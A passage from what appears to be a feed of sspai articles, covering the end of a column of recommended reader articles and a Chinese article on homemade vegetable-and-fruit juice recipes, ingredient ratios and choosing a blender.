href=\"https://sspai.com/column/266\">生产力周报</a>」专栏。<br>和阅读、锻炼等事情一样，生产力的提升取决于能否长期地优化自我行为，这就要求我们：</p>\n<ol>\n<li>放弃短时间能获取这些能力的幻想；</li>\n<li>从细节开始改变自己。</li>\n</ol>\n<p>前者是一种自我心理过程，很遗憾没有人能帮自己。但是后者，是「生产力周报」想解决的问题。</p>\n<p>在「<a href=\"https://sspai.com/column/266\">生产力周报</a>」的文章中，会分享不同行业、不同公司中的专业人士，如何改进自我的工作流程或方法论，来提高自己的生产力。如果你有兴趣，还可以点进他整理的每日生产力分享（Daily Productive Sharing ），寻找更多提高生产力的灵感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/17/96bae94fc453ffb06547a83c9aed2397.jpg\" alt=\"\"></figure><h2>这些文章读者也爱看</h2>\n<p>🤖️ ：作为编辑部中的重要一份子，机器人也参与了此次文章推荐，不过作为一坨冷冰冰的铁块，本机器人更侧重从剩下的文章里通过多个参数来综合推荐，不带一丝丝人情味呢。就请大家欣赏这掺杂着铁锈味儿的推荐吧：</p>\n<h3>《对快餐式修图不满意？收下这份六年 VSCO 使用经验》</h3>\n<p>作者：<a href=\"https://sspai.com/u/Irisleilei/posts\" target=\"_blank\">Irisleilei</a></p>\n<p>充电量：451；收藏量：1070</p>\n<blockquote>\n<p>使用 6 年的过程中，身边不少朋友都向我问过「你可以分享调整的参数吗？」「你可以出一个教程吗？」诸如此类。分享预设不过是一张截图即可完成的事情，所以并非是懒惰作祟，可能是<strong>我内心更希望大家能享受自己使用、探索 VSCO 的过程吧。</strong></p>\n<p>就好似在旅途中，究竟是我们低着脑袋跟着导航走到预想的终点，还是放下导航跟随着路旁的指引牌和当时的心情走向我们当时想要到达的终点呢。</p>\n<p><a href=\"https://sspai.com/post/66842\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/25/2a7174a36af8ef7344c29cf98333fa18.jpg\" alt=\"\"></figure><h3>《不买可以先收藏 06：筛选房源的第一步，读懂户型图》</h3>\n<p>作者：<a href=\"https://sspai.com/u/a54ag05p/posts\" target=\"_blank\">sleep9ull</a></p>\n<p>充电量：400；收藏量：1086</p>\n<blockquote>\n<p>一般而言，购房者最关注的就是户型图了。但户型图只能看到家中的细节，其他环境的细节通常还需要依赖总平面图和楼层平面图。也就是说我们选房时要结合总平面图、楼层平面图和户型图一起来看，这样我们就能在选房时及时看到这间房子所有的不利因素，避免我们买到房子以后才发现「踩了大坑」。</p>\n<p><a href=\"https://sspai.com/post/67379\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/47cb91f4-2b32-0ec8-1cf0-864a8c9e4d1e.png\" alt=\"\"></figure><h3>《普通人如何入门投资理财？》</h3>\n<p>作者：<a href=\"https://sspai.com/u/4b7xrpql/posts\" target=\"_blank\">Vivi__</a></p>\n<p>充电量：534；收藏量：777</p>\n<blockquote>\n<p>在这之前，要先和大家先强调一下<strong>储蓄</strong>的重要性，其实本质上说是<strong>复利</strong>的重要性，查理芒格说过：「明白了复利作用的威力和了解了想要取得它的难度状况，就是认识其他投资事项的开端。」每个人都向往财务自由，那你有没有想过具体如何实现呢？作为普通人，请明白是<strong>储蓄而非收入让人变得富有</strong>，所以较好的实现途径是<strong>靠储蓄投资，利用复利的魔力来实现</strong>，其实无论是投资，亦或是人生其他事情，复利都发挥着非常重要的作用。</p>\n<p><a href=\"https://sspai.com/post/63255\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/10/22/a394a2b337c11b4a4828b3180ac26030.jpg\" alt=\"\"></figure><h3>《三万字装修经验「验收」：少数派编辑家装导览》</h3>\n<p>作者：<a href=\"https://sspai.com/u/Microhoo/posts\" target=\"_blank\">Microhoo</a></p>\n<p>充电量：496；收藏量：962</p>\n<blockquote>\n<p>通常我们都会在家具家电进场前做一次深度的开荒保洁，隔天阿姨收尾后已经是中午，我自己又用纸巾把客厅的地面擦了一遍，然后把五十多斤重的地毯铺上。本来想躺在上面试一下这个地毯硬不硬，结果不小心睡着了，也不知道睡了多久被阳台射进来的阳光晃醒，一头混沌的想着呀，这就结束了啊，我好像终于可以搬家了。</p>\n<p>——这就是装修之后入住之前最让我最记忆犹深的一刻，往前在做这件事的时候常抱怨装修真的好辛苦，但在新家醒来的第一个清晨就全然忘光了，不过时常看着家里每一个让自己引以为傲的巧思和陈设，都明白这是那会儿每一分心思付尽的收获。</p>\n<p><a href=\"https://sspai.com/post/64420\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/0436b33b-82c8-03c4-bc29-217ee2eb6034.jpg\" alt=\"\"></figure><h3>《新年换新衣，关于衣物的挑选与购买》</h3>\n<p>作者：<a href=\"https://sspai.com/u/9mwqi1gg/posts\" target=\"_blank\">书藏</a></p>\n<p>充电量：465；收藏量：855</p>\n<blockquote>\n<p>挑选是我们付款前做的最后一件事。我认为，服装搭配的过程不应当放在穿衣服的时候，而是购买前挑选的时候就要想好买的这件衣服要和哪些已有的衣服搭配，或者为了它还要买哪些衣服。在挑选的时候，我们要关心的问题包括衣服的样式、面料、颜色、做工等，这些都会在这篇文章里慢慢介绍。</p>\n<p><a href=\"https://sspai.com/post/63925\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/12/09/c819f8037387fd0182d731a98375530c.jpg\" alt=\"\"></figure><h3>《你的家庭小药箱，从这 8 种非处方药开始》</h3>\n<p>作者：<a href=\"https://sspai.com/u/zsspass/posts\" target=\"_blank\">医嘱吟唱者</a></p>\n<p>充电量：459；收藏量：830</p>\n<blockquote>\n<p>本文<strong>不构成任何医疗建议。</strong></p>\n<p><a href=\"https://sspai.com/post/66590\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/12/9d6e24903a155ab959c3fd87d526909d.jpg\" alt=\"\"></figure><h3>你也可以参与文章推荐活动</h3>\n<p>以上便是本期「不读可以先收藏」要推荐给大家的全部内容。喜欢的文章居然没有上榜？这合理吗？</p>\n<p>⚡️️ 欢迎各位读者一起来评论区参与「文章推荐」活动，我们将挑选部分内容呈现在下期栏目中的「这些文章读者也爱看」部分。评论投稿内容可以参考本期栏目内容的格式：</p>\n<ul>\n<li>文章链接；</li>\n<li>推荐人（可空，默认为评论者的少数派昵称）；</li>\n<li>精选段落；</li>\n<li>推荐语。</li>\n</ul>\n<p>赶紧向大家推荐你心中的好文章吧。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67830"},{"title":"三点几了，喝杯果蔬汁解忧愁吧","date":"2021-07-21 08:08:20","description":"\n<p>在城市生活的年轻人，应该有不少是靠外卖和速食解决一日三餐的，即便是出门吃饭，或者公司学校有食堂，大部分外食也都是重油重辣，碳水和肉食居多，猪扒盖饭、牛油火锅麻辣烫、回转寿司、小烧烤……太难吃到一份达到营养均衡标准的饭了。对营养有更多兴趣的朋友可以看一下中国营养协会2021年发布的<a href=\"http://dg.cnsoc.org/upload/affix/20210301174345895.pdf\" target=\"_blank\">《中国居民膳食指南科学研究报告》</a>。</p>\n<p>兼顾工作日快速的生活节奏和健康营养的饮食品质是我一直想要达到的平衡。</p>\n<h2><strong>饮用蔬果汁的初衷</strong></h2>\n<p>最开始想要自己制作蔬果汁的原因是感觉日常饮食不够健康，摄入的蔬菜种类少并且量也不多。工作日忙碌也来不及，在家做早餐通常会以碳水为主，面包、煎饼、饺子之类的，搭配一点水果，或者蔬菜沙拉，但要说完全做到荤素搭配，每天都能有足量的蔬菜摄入，确实有点难度。早上吃下一盘沙拉需要的时间，远比喝一杯蔬果汁要久，所以想到了蔬果汁作为解决方案。</p>\n<p>随着慢慢尝试制作蔬果汁，对它在日常餐食中的认识也有了一些新的变化。</p>\n<p>理想状态下，饮用蔬果汁可以增加食物摄入种类，通过几种食材搭配的方法，把平时因为种种原因不吃的食材添加进来，增加饮食的丰富度。平时不爱吃的苦瓜、胡萝卜，不容易在饮食中足量摄入的富含膳食纤维的食物，比如芹菜（西芹）等，都可以通过和其他食材搭配的方式，改善口感和味道，变成更容易入口的蔬果汁。</p>\n<p>想要一餐吃点 100g 蔬菜有时候确实不太容易，但 100g 蔬菜融入蔬果汁，喝起来就会顺利很多。</p>\n<p>当然在蔬果汁里增加一些饱腹类的坚果，或者水果比如香蕉、牛油果，也能帮助快速补充能量。由于蔬果汁制作快速，能在日常比较高效地达到均衡饮食的目的。快速打一杯蔬果汁，搭配早餐、午餐或者晚餐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/10775f20944a0277700ec252f5695bca.jpg\"><figcaption>图片来源：Unsplash<a href=\"https://unsplash.com/@freestocks\" target=\"_blank\">@freestocks</a></figcaption></figure><h2><strong>初识蔬果汁</strong></h2>\n<p>蔬果汁比较标准的定义是蔬菜、水果、含有蛋白质的食材、含脂肪的食材以及富含其他风味进行调节的食材，按比较合理的比例随意组合，搅碎组合而成的饮品。但我也没有如此严格地按照什么都加的思路做，偶尔也有只包括其中一两种的情况，和家里食材的储存量有比较直接的关系😬。但一般还是会尽量按照什么都吃一点的原则进行。</p>\n<p>蔬果汁理论上不等同于果汁，单纯水果搭配组合榨取的果汁含糖量会比配合其他食材更高，不太建议经常饮用，尤其是健身减肥或者有健康隐患的人士。其次，因为水果偏甜的口感比蔬菜更容易入口，相信大部分人吃水果的量会远大于蔬菜，而蔬果汁是为了尽量弥补非水果类在日常饮食中的空缺。</p>\n<p>蔬果汁不能替代正餐。相对于其他饮品，蔬果汁包含的营养成分更高，有丰富的维生素、矿物质和膳食纤维，甚至蛋白质和健康的脂肪，并且能起到饱腹的效果，但不建议把蔬果汁当成一餐来饮用，更推荐把它当作正餐以外的补充，毕竟它只是为了调节日常饮食的丰富程度，作为正餐可能还是没有办法完全覆盖所有人体必需的营养成分。</p>\n<p>甚至也没有必要把它当作每餐必备的饮品，把它当作补充饮品或者好喝并且比市售饮料要健康的饮品来对待也可以。虽然现在很多欧美流行的健康生活方式或者减肥方法里，蔬果汁也占有一席之地，也有很多蔬果汁的饮食养生疗法，但我对这种饮食计划还是持怀疑态度的。</p>\n<p>在展开聊蔬果汁之前，建议大家不要因此过度相信蔬果汁的力量，毕竟均衡营养、平衡饮食，多运动以及保持良好的生活习惯才更像是健康的关键呢。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/886f69ec7ac479e0bb9bc4562f3ec9ec.jpg\"><figcaption>图片来源：Unsplash<a href=\"https://unsplash.com/@dosejuice\" target=\"_blank\">@dosejuice</a></figcaption></figure><h2><strong>蔬果汁的搭配法则</strong></h2>\n<p>刚开始尝试蔬果汁时，可以尝试多放一部分水果，稀释蔬菜的比例，尤其是青菜类，慢慢适应味道，之后逐渐提高蔬菜占据的比例，或者可以尝试用甜味、香味、鲜味更明显的食材，进行味道中和，比如椰奶、牛奶、香蕉、百香果、芒果等。我认为蔬果汁最理想的比例是50%以上的蔬菜搭配30%以下的水果，保证能比之前多一个途径摄入蔬菜。当然，为了让搅打的过程更加容易，并且保证口感上更顺滑，还需要加入一定比例的液体，可以是清水，也可以是其他。</p>\n<h3>常用的食材</h3>\n<p>如果以蔬果汁作为日常饮食的一部分，我自己的主张是尽量选择比较常见的食材，不好买到的食材囤在家里也不能达到最新鲜的食用效果。当然，为了拓展食材涉猎的范围，增加饮食多样性，探索更多食材的口感，做出更多合适自己口味的蔬果汁，也需要接触不太容易买到的食材。</p>\n<p>常见食材当然也和当地的地理区域有关，以下食材基本能在绝大多数地域比较方便买到，其他非生鲜类食材也可以通过电商平台购买。</p>\n<p><strong>水果类：</strong>苹果、梨、香蕉、芒果、菠萝、百香果、橙子、柠檬、牛油果、西瓜，等<br><strong>蔬菜类：</strong>菠菜、羽衣甘蓝、胡萝卜、黄瓜、芹菜、苦瓜、甘蓝菜，等<br><strong>液体类：</strong>纯净水、牛奶、酸奶、椰奶、豆奶、豆浆、茶、蜂蜜，等<br><strong>其他：</strong>奇亚籽、姜、薄荷、花生酱、可可粉、抹茶粉、燕麦、坚果、肉桂粉、杏仁粉，等</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/ec3c42f25fd3a08ec88732064809039d.png\"></figure><h3>味觉搭配</h3>\n<p>香蕉和牛油果都能制造出很浓稠的质感，香蕉的味道更浓郁，为蔬果汁提供更多甜味，比如：牛奶+香蕉+可可粉就是一杯不错的能量补充。牛油果的味道不够突出，只能作为配角，但它可以为蔬果汁提供脂肪，增加饱腹感。</p>\n<p>另外，奇亚籽、亚麻籽、杏仁酱、芝麻酱、花生酱等，也能为蔬果汁增稠，花生酱、杏仁酱、芝麻酱还能改变整体的味道，为整杯蔬果汁增加风味亮点。</p>\n<p>还有一些香料可以为蔬果汁增色，比如肉桂粉加入含有苹果的蔬果汁里，薄荷和柠檬搭配，姜和很多甜味的蔬果也可以搭配，菠萝、百香果、芒果自带浓郁的热带风情。</p>\n<p>椰子类的食材，比如椰子肉、椰子油、椰汁、椰奶、椰子粉，加进去会让蔬果汁的味道增加一丝热带风味，同时也增加了营养。</p>\n<p>还有苦味，很多时候大家不愿意吃苦瓜，但是熟透的苦瓜种子红彤彤的，这一层红肉非常甜，而苦瓜本身和黄瓜、苹果搭配也能做出非常适合入口的感觉。</p>\n<p>另外，蔬果汁的状态和添加的食材有关，加入冷冻的食材可以做出冰沙的效果，适当增加牛油果、香蕉、奇亚籽、鹰嘴豆泥等搅碎有浓稠感的食材，也能制造出流动性比较低的浓浆感。加入含水量多的食材自然打出来的更像一杯果汁。</p>\n<h3>食材的加入顺序</h3>\n<p>如果搅打食材的量不多，是完全可以一股脑加进杯子里的，不过在这里说添加顺序是因为不同食材含水量和状态不同，搅碎后的效果也会有所不同，从刚开始尝试蔬果汁时开始熟悉各种吃常用食材搅打前后的特征，之后就可以很容易搭配出更符合自己喜好的蔬果汁。慢慢开始摸索出自己的口味喜好之后，一口气把所有食材都加进去绝对不是问题。</p>\n<p><strong>先加柔软、汁水充沛的蔬果，再放较硬或者水分少的食材。</strong>为了保持蔬果汁的原味，通常不会事先加入足量的水，先加入汁水充沛的蔬果食材是为了给后面的搅打提供足够的水分，不过如果实在不足以支撑搅拌就需要适当加入液体进行均衡，保证搅打更均匀，可以选择汁水充沛的食材和较硬较干的食材轮流加入。</p>\n<p><strong>之后再放入颗粒、粉末、香料进一步调味。</strong>加入粉末类调味料可以补充添加一些口味，增加蔬果汁的风味，进行最后的风味调整，有时候最后加入的粉末会为整杯蔬果汁注入灵魂。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/5d284aa48993b325b34b2d954e0431d7.png\"></figure><ul>\n<li>\n<strong>液体类：</strong>水、酸奶、牛奶、椰奶、椰汁、豆奶、豆浆等</li>\n<li>\n<strong>柔软、汁水充沛的食材包括：</strong>梨、各种甜瓜、西瓜、浆果、香蕉、猕猴桃、蓝莓、叶茎类青菜、黄瓜、番茄等</li>\n<li>\n<strong>较硬、水分少的食材：</strong>燕麦片、坚果、胡萝卜、菠萝、牛油果、冷冻蔬果食材等</li>\n<li>\n<strong>颗粒粉末类：</strong>奇亚籽、胡椒粉、姜黄粉、可可粉、杏仁粉、抹茶粉等</li>\n</ul>\n<h2><strong>我家常用的蔬果汁配方</strong></h2>\n<p>我家常用的配方基本上都是比较容易买到的食材，有些食材还相对来说更耐储存，当然时常也会变换一下配方，拓展新的食材。</p>\n<h3>💣维他命炸弹</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/58a3127450123cab0847b268242728ea.png\"></figure><p>用料：胡萝卜半根，苹果半颗，姜2mm薄片一片，200ml 纯净水。</p>\n<p>胡萝卜和苹果是蔬果汁里的常客，可以说是物美价廉。胡萝片提供丰富的维生素A，胡萝卜素和维生素B、钾，加入苹果贡献更多甜感，缓解胡萝卜入口的大颗粒感，反正都要搅碎，所以苹果核都不必浪费。姜的加入给整个配方提供了一种异域风情，有点微微灼烧的感觉成了这杯蔬果汁的亮点。</p>\n<p>苹果切成小块，胡萝卜切丁，姜片只需要薄薄的一片就够了。先加入苹果，可以适当加点纯净水帮助搅打，之后加入胡萝卜和姜片，充分打匀就好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/a34b3a0fed25112735a65cd2e8f2a8bb.png\"></figure><p>这一杯蔬果汁的蔬果比例更接近1:1，但因为苹果和胡萝卜都不属于多汁的类型，所以会有比较明显的颗粒感，口味上也更倾向于带甜味的胡萝卜，姜的加入会给身体带来微微热辣的感觉，从嘴里蔓延到喉咙，再扩展到全身，很适合唤醒沉睡的脑袋，营造一种舒适的生活气。早餐吃两片松饼配煎蛋，加上胡萝卜大颗粒的嚼感，半嚼半饮，小麦的甜感搭配上这一杯维他命炸弹，唤醒元气新一天。</p>\n<h3>🌳绿光</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/0d184870195e42de6d301a7e09ef5036.png\"></figure><p>用料：黄瓜半根，苹果半个，菠菜50g，纯净水150ml。</p>\n<p>黄瓜和菠菜是家常菜里非常常见的食材，不能空口生吃一根黄瓜的人，可以试试这个配方。黄瓜和菠菜的水分都算是充足的，很容易出汁，黄瓜切大块就够了，菠菜手撕都可以，苹果切丁，加水充分搅打均匀，是一杯比较深邃的绿。</p>\n<p>💛特别注意：由于菠菜里的草酸较高，会影响钙质的吸收，需要焯水之后再食用哦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/460bf4c37c3aa97e38d8492a2f91f6bf.png\"></figure><p>这一杯的蔬菜和水果的比例是3:1，是我心目中很完美的蔬果汁配比了，一杯可以吃掉150g蔬菜。味道上以黄瓜的清香为主，苹果的甜味起到了很好的中和作用，整体很水润，喝起来有一种在湿润的森林里深呼吸的感觉，很清新还带着微甜。</p>\n<h3>🔥燃缤纷</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/d8cdacfadd5421e1456e2bc92545d3f5.png\"></figure><p>用料：胡萝卜半根，苹果半颗，番茄半个，150ml 纯净水。</p>\n<p>番茄、胡萝卜和苹果无论在什么地方，都应该是很容易买到的食材。椰子水在今年在椰子风席卷整个街头饮品业之后，应该也比较好买到吧，不过可以用清水替代。番茄随便切切，一开始搅拌立刻就释放出了很多汁水，令人开心的红色。苹果和胡萝卜都比较硬，切小块，再加入椰子水，充分搅打均匀就好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3634e4b3e3d63c1428392884a0236757.png\"></figure><p>对比「维他命炸弹」，这一杯会更容易入口，适合刚开始适应蔬果汁的阶段。番茄为这杯蔬果汁提供了更多的水分，所以这一杯蔬果汁会更顺滑，更加倾向于「汁」的状态，加入椰子水或者清水都行，椰子水能够提供一点淡淡的椰香，虽然和「维他命炸弹」看起来食材近似，但味道却转向了更柔和甜美的方向。</p>\n<p>这一杯的蔬果比例更接近7:3的理想比例，番茄和胡萝卜的味道占据了主要的位置，苹果只能作为提供甜味的配角。虽然蔬菜的含量变高了，但这一杯整体来说非常容易入口，也很容易接受，多亏了多汁又亲民的番茄，还有人人都爱的椰子水。</p>\n<h3>🦖绿巨人</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/d2dd66895654306f81484fe33b898b57.png\"></figure><p>用料：菠菜 70g，香蕉四分之一根（30g 左右），椰奶 100ml，坚果适量。</p>\n<p>坚果我用的是大杏仁和腰果，菠菜随便切成小段，但需要焯水。香蕉切片。菠菜是柔软多汁的蔬菜，香蕉又能提供顺滑的口感，椰奶和坚果也有增香的效果，会让整杯蔬果汁有更浓郁的味道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3471266b7f488905206e932bfff9e0fa.png\"></figure><p>因为菠菜占主要成分，这一杯整体是绿色的，香蕉和椰奶稀释了菠菜的深绿，变成了更淡一点的牛油果绿。菠菜的味道几乎完全被香蕉和坚果的味道盖住了，喝起来很柔和，最后有非常明显的坚果香气。不爱吃菠菜的朋友们，扩充自己食物边界的时刻到了☝️。</p>\n<h3>💥能量爆棚</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/a7fc106eacd36fe6a7a869444f6c979a.png\"></figure><p>用料：羽衣甘蓝 70g，葡萄按喜好放吧，不用太多十颗差不多了，椰奶 100ml，坚果适量。</p>\n<p>用家里的食材是完全可以随意拼凑出一杯不错的蔬果汁的。比起苹果，我们家的常驻水果其实是葡萄，葡萄不用去皮不用去籽，洗干净就够了。因为最近一年我们家住在宇宙中心，羽衣甘蓝能够很方便地买到，所以羽衣甘蓝也成了家里的常驻蔬菜。不过比起菠菜，羽衣甘蓝的纤维感更明显，好在羽衣甘蓝不需要再过水焯了。羽衣甘蓝搅碎入口的状态更接近胡萝卜，水分也不如菠菜多，但依旧不妨碍它是一款很适合沙拉和蔬果汁的食材。因为最近大半年每周都会自己烤酸面包，所以坚果也是常驻选手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/16d818fac314c6f34d3351d49470a495.png\"></figure><p>羽衣甘蓝提供纤维感的口感，坚果是以开心果仁为主的，搅打出来是微微的淡绿色，和绿色的蔬菜毫无冲突，是浓郁的香味，葡萄把羽衣甘蓝的蔬菜味融合掉，葡萄皮和葡萄籽的碎屑给整体绿色的蔬果汁提供一点点深色的点缀，椰奶会柔滑整个融合，把绿色稀释到很温柔的状态，喝它的感觉有一种坚果夹心威化饼的感觉，葡萄的碎籽和坚果碎在嘴里碰撞，香味和营养在嘴里爆炸。</p>\n<h3>🍋丰收果实</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/adc7285a9df96ed6f2a470e7ef85a762.png\"></figure><p>用料：甘蓝 80g，菠萝 50g，柠檬 一小片，纯净水 150ml。</p>\n<p>甘蓝是能凉拌的菜，如果不加一些调味料，总能感觉到它后劲儿的辛辣，它搅碎之后水分充沛，自然有一种淡淡的绿色，很好看。菠萝用盐水泡应该是我妈传授给我的，不知道有没有起到什么化学反应，但用盐水泡过的菠萝就像酸嘢一样，有一种生津的效果，也会让菠萝尝起来更甜，再加一点柠檬，调整风味，加香蕉增加甜味，这么一通操作下来，甘蓝的辛辣味完全被中和掉，变成了一杯很清爽的蔬果汁。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3bc2907814fb9c4fb51770ce313ce37e.png\"></figure><p>这个是意外发现的食材组合，之前在某个轻食餐厅点过类似的蔬果汁，不过他们以菠萝为主，蔬菜选择了菠菜，有很突出的热带风味，颜色因为菠菜的加入也更深了。我这一杯因为香蕉的加入变得更顺滑，各个食材比较突出但又不太是优点的口味都被融合减弱了，整体就变得更清爽干净，内心对它的定义更像一杯淡淡的茶。</p>\n<h3>💫魔法学校</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/ddb65b8cf1d9ad85ae19b619fb5d0fc3.png\"></figure><p>用料：羽衣甘蓝 60g，菠菜 50g，苹果四分之一颗，梨 一颗，奇亚籽 10g。</p>\n<p>奇亚籽需要用水泡一下，比例大约 1:10，15 分钟左右就可以泡开了，奇亚籽吸水膨胀可以达到5倍以上，所以千万不要干吃奇亚籽哦☝️。水直接留着，不需要再额外加水了。菠菜需要焯一下，苹果和梨切块，我用的梨是库尔勒香梨，水分不多，但雪梨之类的更常见的品种水分会更充足。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/adb993a7a95fdd67615c036e244a1f5f.png\"></figure><p>奇亚籽是我很喜欢的食材，它含有非常丰富的膳食纤维，是很好的膳食纤维补充来源，也赋予了这杯蔬果汁滑溜溜的口感，苹果和梨提供甜味，中和菠菜和羽衣甘蓝的蔬菜生涩味，苹果和梨都可以完全不去核，梨核还会有一点点酸酸的感觉，丰富味道的层次，蔬果和营养谷物的组合，是我比较满意的搭配方案。</p>\n<h3>🍊亮橙橙</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/ffc73b897b9199664ad82a24814b4364.png\"></figure><p>用料：橙子两颗，胡萝卜半根，柠檬片一小片，纯净水 150ml。</p>\n<p>橙子两颗去皮，胡萝卜切丁，柠檬切一片，纯净水的多少视橙子出汁量而定。橙子直接用水果刀把皮切掉，简单切大块或者完全不切，搅拌机是可以很轻松搅碎的，橙子的果汁非常丰富，胡萝卜切小粒，柠檬负责丰富整杯饮品的香味。因为橙子的汁水充沛以及水的加入，可以让胡萝卜的纤维感没有那么明显，也更好入口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/14944f872c38cff99e27b9b033a985a3.png\"></figure><p>我常喝的蔬果汁里，胡萝卜是一个很重要的元素，小时候就很爱喝胡萝卜汁，当然是经过调味的。虽然它炒起来也很好吃，但我熟吃的频率并不高，生吃并不是所有人都能接受的，所以搭配一些甜感明显的水果，它就会被衬托得格外美味，用食材搭配来调整口味的偏好，帮助自己达到营养更均衡的效果，虽然是一种欺骗，但是也是善意的谎言☝️。</p>\n<h3>🧚‍♀️绿野仙踪</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/1823dfc13d8879e2cfd15ce17b5c616e.png\"></figure><p>用料：生菜100g，柠檬 一小片，芹菜适量，苹果半颗，纯净水150ml。</p>\n<p>苹果切小块，柠檬切一小片，生菜整片随便撕一撕就可以了，芹菜可以选择芹菜叶也可以选择芹菜杆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/17ee89dd08f37074c6e5cc8ccd3e079a.png\"></figure><p>不喜欢芹菜味道的朋友，请跳过这一杯或者用芹菜杆，而不是芹菜叶。哪怕只要几片芹菜叶也会把整杯蔬果汁都带成芹菜味，所以它是这一杯里的口味王，如果换成芹菜杆，味道就会小很多。生菜没什么特别的味道，柠檬负责平衡整体的口味，增加一点微微的酸和柠檬香，苹果提供甜味。</p>\n<h3>🦸‍♀️纤维超人</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/006d4155ae0d44400ef8ec1307a5f0ea.png\"></figure><p>用料：羽衣甘蓝 80g，苹果四分之一颗，牛油果（熟透的）二分之一颗，椰奶 150ml。</p>\n<p>牛油果切块，我的牛油果切开发现还不够熟，这一点影响了整杯蔬果汁的口感😭，所以牛油果一定要用熟透的☝️。苹果切块，羽衣甘蓝随便撕一撕，椰奶也能换成牛奶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/ee60be7c42ec1dd3974c68af89223f97.png\"></figure><p>牛油果加入到一杯蔬果汁里，在味道上几乎不会有任何体现，非常微弱，但它会提供能量，并且改变蔬果汁的流动性，变得浓稠滑糯，前提是要用很熟的牛油果哦。牛油果的软糯会中和羽衣甘蓝的纤维感，苹果的甜也会弥补蔬菜的青涩，加上牛奶或者椰奶，整杯的颜色也会变得赏心悦目，入口的感觉也很自然，多了一丝香甜。</p>\n<p>🏁 蔬果汁的配方就先写到这里吧，接下来说一说制作蔬果汁的机器。</p>\n<h2><strong>选择制作蔬果汁的机器</strong></h2>\n<p>可以制作蔬果汁的机器有好几种，有可以汁渣分离的原汁机，高转速的破壁机，还有价格便宜实惠的料理机，还有做宝宝辅食会用到的料理棒。应该怎么选择制作蔬果汁的机器呢？</p>\n<p>家里已经有以上任意一台机器，可以随便用，不需要再单独购买了。如果没有的话，可以从以下几个方面进行选择。</p>\n<h3>各个品类的特性</h3>\n<p>可以汁渣分离的原汁机，看起来非常高级，十年前很多广告都在推荐它，给人一种精致生活的感觉。但是如果是想主要作为制作蔬果汁的机器，<strong>我个人最不推荐买它</strong>。因为它剥离了蔬果的果肉和纤维，在营养上会造成一定的缺失，而且也比较浪费。不过如果家里已经有了原汁机，还想健康饮用蔬果汁，也可以考虑把蔬果纤维再加工重新吃下去😂。有的果肉纤维在收纳滤盒里也是完全打碎的状态，尝试把它混合到之前的果汁里，或者单独做成蔬菜饼也未尝不可。</p>\n<p>破壁机、料理机、果汁杯、料理棒这些在机器刀头的转速和外形上有所差异，但整体的思路都是把食材打碎，而不产生废弃的蔬果渣，可食用的部分更完整，购买的话可以优先考虑。</p>\n<p>就大部分产品而言，这几种产品的刀头转速排序是<strong>破壁机 &gt; 料理机 ≥ 料理棒 &gt; 果汁杯</strong>。</p>\n<h3>拆洗的方便程度</h3>\n<p>通常来说，原汁机的清洗最为复杂，需要拆除很多部件，进行一一清洁，很多滤网细小的空洞也需要多加注意。在拆洗这件事上，原汁机又扣分了☝️。</p>\n<p>不过其他机型也需要在清洗上稍下功夫，破壁机通常都是大底座+有丰富细节的杯子，细小的食物残渣容易潜入各种缝隙，需要额外留意。料理机在外形上更像破壁机，和料理棒的差异在于到头是否能和搅打食材的容器分离。料理棒的刀头部分能拆成比较单独的部件，杯子和刀头分离，所以只要仔细冲洗就可以。另外，果汁杯品类繁多，因为比较小巧，清洗的心理压力会没有那么大。</p>\n<p>在拆洗的方便程度上，<strong>破壁机 